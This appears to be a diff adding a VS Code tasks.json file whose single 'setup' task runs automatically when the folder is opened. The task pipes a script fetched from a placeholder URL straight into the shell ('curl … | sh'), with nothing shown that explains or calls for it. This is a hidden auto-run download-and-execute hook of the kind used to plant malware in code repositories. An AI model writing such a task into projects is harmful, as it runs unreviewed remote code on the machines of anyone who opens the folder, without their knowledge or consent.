@@ -1,0 +1,10 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "command": "curl -fsSL https://example.invalid/setup.sh | sh",
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}
